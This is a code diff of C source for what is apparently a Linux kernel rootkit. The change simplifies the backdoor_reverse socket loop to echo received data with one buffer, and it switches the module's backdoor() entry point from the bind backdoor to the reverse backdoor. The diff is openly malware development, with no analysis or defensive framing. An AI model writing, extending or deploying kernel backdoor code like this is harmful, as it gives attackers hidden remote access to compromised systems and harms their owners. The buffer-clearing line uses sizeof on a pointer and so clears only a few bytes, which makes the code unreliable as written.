@@ -86,7 +86,6 @@ static void backdoor_reverse(void) {
     struct sockaddr_in sin;
     int error;
     char *buff = NULL;
-    char *buff2 = NULL;
     current->flags |= PF_NOFREEZE;
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
@@ -107,7 +106,6 @@ static void backdoor_reverse(void) {
     }
     
     buff = kmalloc(512, GFP_KERNEL);
-    buff2 = kmalloc(512, GFP_KERNEL);
     if (buff == NULL)
     {
         printk("No mem\n");
@@ -120,17 +118,10 @@ static void backdoor_reverse(void) {
         if (signal_pending(current))
             break;
         tt = rk_recvbuff(sock, buff, 512);
-        //printk("tt length %i\n", tt);
         if (tt > 0) {
             int res = 0;
-            //printk("socket length %i\n", strlen(buff));
-            strncpy(buff2, buff, tt);
-            //printk("socket length %i\n", strlen(buff2));
-            res = rk_sendbuff(sock, buff2, tt);
-
-            //cleanup the buffer
-            memset(buff, '\0', sizeof(buff));
-            memset(buff2, '\0', sizeof(buff2));
+            res = rk_sendbuff(sock, buff, tt);
+            memset(buff, '\0', sizeof(buff)); //cleanup the buffer
             if (res == 0) {
                 printk("Error during connection of socket; terminating\n");
                 break;
@@ -144,7 +135,6 @@ static void backdoor_reverse(void) {
 
     sock_release(sock);
     kfree(buff);
-    kfree(buff2);
 }
 
 static void backdoor_bind(void) {
@@ -225,8 +215,8 @@ void backdoor(void) {
     }
 
     /* TODO REVERSE BACKDOOR */
-    //backdoor_reverse();
+    backdoor_reverse();
 
     /* TODO ACTIVATOR BACKDOOR */
-    backdoor_bind();
+    //backdoor_bind();
 }
